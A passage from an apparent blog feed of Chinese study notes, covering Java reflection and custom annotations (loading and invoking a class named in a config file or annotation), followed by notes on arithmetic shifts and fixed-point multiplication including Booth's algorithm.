punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取所有方法</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Method</span> m <span class="token operator">:</span> methods<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>            m<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> name <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="23-反射案例"><a class="markdownIt-Anchor" href="#23-反射案例">#</a> 2.3 反射案例</h2><ul><li>需求：写一个 &quot;框架&quot;，不能改变该类的任何代码的前提下，可以帮我们创建任意类的对象，并且可以执行任意类的方法<ul><li>实现：<ol><li>配置文件</li><li>反射</li></ol></li><li>步骤：<ol><li>将需要创建的对象的全类名和需要执行的方法定义在配置文件中</li><li>在程序中加载读取配置文件</li><li>使用反射技术来加载类文件进内存</li><li>创建对象</li><li>执行方法</li></ol></li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>reflect</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span></span><span class="token punctuation">;</span><span class="token comment">/** * 假设的框架类 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//可以创建任意类的对象，可以执行任意方法</span>        <span class="token comment">/**         前提：不能改变该类的任何代码，可以创建任意类的对象，可以执行任意方法         */</span><span class="token comment">//        Person p = new Person();</span><span class="token comment">//        p.eat();</span>        <span class="token comment">//1.加载配置文件</span>        <span class="token comment">//1.1创建Properties对象</span>        <span class="token class-name">Properties</span> pro <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//1.2加载配置文件，转换为一个集合</span>        <span class="token comment">//1.2.1获取ckass目录下的配置文件</span>        <span class="token class-name">ClassLoader</span> classLoader <span class="token operator">=</span> <span class="token class-name">ReflectTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> is <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span><span class="token string">"pro.properties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        pro<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.获取配置文件中定义的数据</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> pro<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"className"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> methodName <span class="token operator">=</span> pro<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"methodName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.加载该类进内存</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> cls <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.创建对象</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//5.获取方法对象</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//6.执行方法</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>注：类加载器没学，回头补上</p></blockquote><h1 id="3-注解"><a class="markdownIt-Anchor" href="#3-注解">#</a> 3、注解</h1><ul><li>概念：说明程序的，给计算机看的</li><li>注释：用文字描述程序的。给程序员看的</li><li>概念描述：<ul><li>JDK1.5 之后的新特性</li><li>说明程序的</li><li>使用注解：<strong>@注解名称</strong></li></ul></li><li>作用分类：<ol><li>编写文档：通过代码里标识的注解生成文档【生成文档 doc 文档】</li><li>代码分析：通过代码里标识的注解对代码进行分析【使用反射】——<strong> 经常使用</strong></li><li>编译检查：通过代码里标识的注解让编译器能够实现基本的编译检查【Override】</li></ol></li></ul><h2 id="31-jdk中预定义的一些注解"><a class="markdownIt-Anchor" href="#31-jdk中预定义的一些注解">#</a> 3.1 JDK 中预定义的一些注解</h2><ul><li>@Override：监测点被该注解标注的方法是否是继承自父类（接口）的</li><li>@Depreciated：该注解标注的内容已过时，</li><li>@SuppressWarnings：压制警告 ——@SuppressWarnings (“all”)，一般传 all，写在类上</li></ul><h2 id="32-自定义注解"><a class="markdownIt-Anchor" href="#32-自定义注解">#</a> 3.2 自定义注解</h2><ul><li><p>格式：</p><ul><li>元注解</li><li><strong>public @interface 注解名称 {属性列表}</strong></li></ul></li><li><p>本质：注解本质上就是一个接口，该接口默认继承 Annotation 接口</p><ul><li>public interface MyAnno extends java.lang.annotation.Annotation{}</li></ul></li><li><p>java 反编译命令：javap java.class 文件</p></li><li><p>属性：接口中可以定义的一成员方法</p><ul><li><p>要求：</p><ol><li><p>属性的返回值类型有下列取值，其他不行</p><ul><li><p>基本数据类型（void 不行）</p></li><li><p>String</p></li><li><p>枚举</p></li><li><p>注解</p></li><li><p>以上类型的数组</p></li></ul></li><li><p>定义了属性，在使用时需要给属性赋值</p><ol><li><p>如果定义属性时，使用 default 关键字给属性默认初始化值，则使用注解时可以不进行属性的赋值</p></li><li><p>如果只有一个属性需要赋值，并且属性的名称是 value，则 value 可以省略，直接定义值即可</p><p>定义：String name () default “张三”;使用：@MyAnno (name = “李四”);</p></li><li><p>数组赋值时值使用大括号包裹。如果数组中只有一个值，则大括号可以省略</p></li></ol></li></ol></li></ul></li><li><p>元注解：用于描述注解的注解</p><ul><li>@Target：描述注解能够作用的位置<ul><li>ElementType 取值：<ul><li>TYPE: 可以作用于类上</li><li>METHOD: 可以作用于方法上</li><li>FIELD: 可以作用于成员变量上</li></ul></li></ul></li><li>@Retention：描述注解被保留的阶段<ul><li>@Retention (RetentionPolicy.RUNTIME)：当前被描述的注解会保留到 class 字节码文件中并被 JVM 读取到</li></ul></li><li>@Documented：描述注解是否被抽取到 API 文档中</li><li>@Inherited：描述注解是否被类的子类继承</li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>annocation</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token comment">/** * 元注解：用于描述注解的注解     - @Target：描述注解能够作用的位置     - @Retention：描述注解被保留的阶段     - @Documented：描述注解是否被抽取到API文档中     - @Inherited：描述注解是否被子类继承 */</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">,</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span>METHOD<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//表示该MyAnno3只能作用于类上</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span>RUNTIME<span class="token punctuation">)</span><span class="token annotation punctuation">@Documented</span><span class="token annotation punctuation">@Inherited</span><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">MyAnno3</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="33-在程序中使用解析注解获取注解中定义的属性值"><a class="markdownIt-Anchor" href="#33-在程序中使用解析注解获取注解中定义的属性值">#</a> 3.3 在程序中使用（解析）注解：获取注解中定义的属性值</h2><ol><li>获取注解定义的位置的对象Class/Method/Field 对象</li><li>获取指定的注解<ul><li>getAnnotation(Class)</li><li>这行命令执行后其实就是在内存中生成了一个该注解接口的子类实现对象</li></ul></li><li>调用注解中的抽象方法来获取配置的属性值</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>annocation</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token comment">/** * 假设的框架类 */</span><span class="token annotation punctuation">@Pro</span><span class="token punctuation">(</span>className <span class="token operator">=</span> <span class="token string">"cn.itclass.annocation.Demo1"</span><span class="token punctuation">,</span>methodName <span class="token operator">=</span> <span class="token string">"show"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//可以创建任意类的对象，可以执行任意方法</span>        <span class="token comment">/**         前提：不能改变该类的任何代码，可以创建任意类的对象，可以执行任意方法         */</span>        <span class="token comment">//1.解析注解</span>        <span class="token comment">//1.1获取该类的字节码文件对象</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ReflectTest</span><span class="token punctuation">></span></span> reflectTestClass <span class="token operator">=</span> <span class="token class-name">ReflectTest</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        <span class="token comment">//2.获取上边的注释对象</span>        <span class="token comment">//其实就是在内存中生成了一个该注解接口的子类实现对象</span>        <span class="token class-name">Pro</span> annotation <span class="token operator">=</span> reflectTestClass<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">Pro</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//3.调用注解对象中定义的抽象方法，获取返回值</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">className</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> methodName <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">methodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//下面与reflect一样</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> aClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> o <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> method <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"show"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>itclass<span class="token punctuation">.</span>annocation</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ElementType</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RetentionPolicy</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token comment">/** * 描述需要去执行的类名，和方法名 */</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span>RUNTIME<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Pro</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">className</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> <span class="token function">methodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="34-小结"><a class="markdownIt-Anchor" href="#34-小结">#</a> 3.4 小结</h2><ol><li>以后大多数时候会使用注解，而不是自定义注解</li><li>注解给谁用？<ol><li>编译器</li><li>给解析程序用</li></ol></li><li>注解不是程序的一部分，可以理解为注解就是一个标签</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-junit单元测试&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-junit单元测试&quot;&gt;#&lt;/a&gt; 1、junit 单元测试&lt;/h1&gt;
&lt;h2 id=&quot;11-测试分类&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; </summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>计算机组成原理-数据的表示和运算-2</title>
    <link href="http://example.com/post/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E8%BF%90%E7%AE%97-2.html"/>
    <id>http://example.com/post/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E8%BF%90%E7%AE%97-2.html</id>
    <published>2022-06-12T00:58:10.000Z</published>
    <updated>2022-06-12T07:43:58.840Z</updated>
    
    <content type="html"><![CDATA[<h2 id="移位运算"><a class="markdownIt-Anchor" href="#移位运算">#</a> 移位运算</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612091441213.png" alt="image-20220612091441213"></p><h3 id="算数移位"><a class="markdownIt-Anchor" href="#算数移位">#</a> 算数移位</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612091509237.png" alt="image-20220612091509237"></p><ul><li>移动小数点相当于改变每个位的位权</li><li>移位：通过改变各个数码位和小数点的相对位置，从而改变各个数码位的位权。可以用移位运算实现乘法、除法</li></ul><h4 id="原码的算数移位"><a class="markdownIt-Anchor" href="#原码的算数移位">#</a> 原码的算数移位</h4><p><strong>原码</strong>的算数移位：符号位保持不变，仅对数值位进行移位</p><p>右移：高位补 0，低位舍弃，若舍弃的位等于 0，则相当于除以 2，若舍弃的位不等于 0，则会<strong>丢失精度</strong></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612091854920.png" alt="image-20220612091854920"></p><p>左移：低位补 0，高位舍弃，若舍弃的位等于 0，则相当于 ×2，若舍弃的位不等于 0，则会出现<strong>严重误差</strong></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612092040274.png" alt="image-20220612092040274"></p><p>原码表示的定点小数与定点整数一个效果</p><h4 id="反码的算数移位"><a class="markdownIt-Anchor" href="#反码的算数移位">#</a> 反码的算数移位</h4><p>正数的反码移位：正数的反码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样</p><p>负数的反码移位</p><ul><li>反码尾数部分和原码是完全相反的，</li><li>右移：高位补 1，低位舍弃</li><li>左移：低位补 1，高位舍弃</li></ul><h4 id="补码的算数移位"><a class="markdownIt-Anchor" href="#补码的算数移位">#</a> 补码的算数移位</h4><p>正数的补码移位：正数的补码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样</p><p>负数的补码移位</p><ul><li>补码是从反码的基础上末位 + 1 得到的</li><li>补码的规律为：从右往左到第一个 1 为止，后半部分与原码相同，前半部分和反码相同</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612092435504.png" alt="image-20220612092435504"></p><ul><li>右移：高位补 1，低位舍弃</li><li>左移：低位补 0，高位舍弃</li></ul><h4 id="算数移位总结"><a class="markdownIt-Anchor" href="#算数移位总结">#</a> 算数移位总结</h4><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612092734964.png" alt="image-20220612092734964"></p><h4 id="算数移位的应用举例"><a class="markdownIt-Anchor" href="#算数移位的应用举例">#</a> 算数移位的应用举例</h4><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612092859987.png" alt="image-20220612092859987"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093100771.png" alt="image-20220612093100771"></p><h3 id="循环移位"><a class="markdownIt-Anchor" href="#循环移位">#</a> 循环移位</h3><p>在循环移位的时候整个二进制字符串是进行循环补位的</p><ul><li>循环左移</li><li>带进位位的循环左移</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093301410.png" alt="image-20220612093301410"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093420410.png" alt="image-20220612093420410"></p><p>循环移位的操作很适合把一个数字的低字节和高字节进行调换</p><h3 id="知识点回顾"><a class="markdownIt-Anchor" href="#知识点回顾">#</a> 知识点回顾</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093457421.png" alt="image-20220612093457421"></p><h2 id="定点数原码乘法运算"><a class="markdownIt-Anchor" href="#定点数原码乘法运算">#</a> 定点数原码乘法运算</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093540527.png" alt="image-20220612093540527"></p><p>手算乘法（十进制）</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093701093.png" alt="image-20220612093701093"></p><p>手算乘法（二进制）</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093901732.png" alt="image-20220612093901732"></p><p>考虑用及其实现：</p><ul><li>实际数字有正负，符号位如何处理？</li><li>乘积的位数扩大一倍，如何处理？</li><li>4 个位积都要保存下来最后统一相加？</li></ul><h3 id="原码一位乘法"><a class="markdownIt-Anchor" href="#原码一位乘法">#</a> 原码一位乘法</h3><p>符号位单独处理：符号位等于 x 的符号位异或 y 的符号位</p><p>数值位取绝对值进行乘法计算</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612094309832.png" alt="image-20220612094309832"></p><ul><li>MQ 存放乘数和积的低位</li><li>X 里存放被乘数</li><li>ACC 存放乘积高位</li><li>如果 MQ 的最低位为 1，ACC 就加上 X 中的值，如果 MQ 的最低位为 0，就不进行相加</li><li>相加结束之后 ACC 和 MQ 整体右移一位，循环上述操作</li><li>乘数的符号位不用参与运算</li><li>小数点隐含在积的符号位的右边</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612094735002.png" alt="image-20220612094735002"></p><h3 id="原码一位乘法手算模拟"><a class="markdownIt-Anchor" href="#原码一位乘法手算模拟">#</a> 原码一位乘法（手算模拟）</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612095005360.png" alt="image-20220612095005360"></p><p>原码整数的乘法与小数的运算方法是一致的，注意一下小数点的位置即可</p><h2 id="定点数补码的乘法运算"><a class="markdownIt-Anchor" href="#定点数补码的乘法运算">#</a> 定点数补码的乘法运算</h2><h3 id="补码的一位乘法"><a class="markdownIt-Anchor" href="#补码的一位乘法">#</a> 补码的一位乘法</h3><p>设机器字长为 5 位（含符号位，n=4），x=-0.1101, y=+0.1011，采用 Booth 算法求 x・y</p><p><strong>原码一位乘法</strong></p><ul><li>进行 n 轮加法、移位</li><li>每轮可能加 x 绝对值，可能加 0，具体要看 MQ 的最低位的值</li><li>每次移位是 “逻辑右移”</li><li>符号位不参与运算</li></ul><p><strong>补码一位乘法</strong></p><ul><li>进行 n 论加法、移位，<strong>最后再多来一次加法</strong></li><li>可能加 0，可能加 [x] 补，可能加 [-x] 补，根据当前 MQ 的最低位和辅助位来确定加什么<ul><li>辅助位 - MQ 中最低位 = 1 时，(ACC)+[X] 补</li><li>辅助位 - MQ 中最低位 = 0 时，(ACC)+0</li><li>辅助位 - MQ 中最低位 =-1 时，(ACC)+[-X] 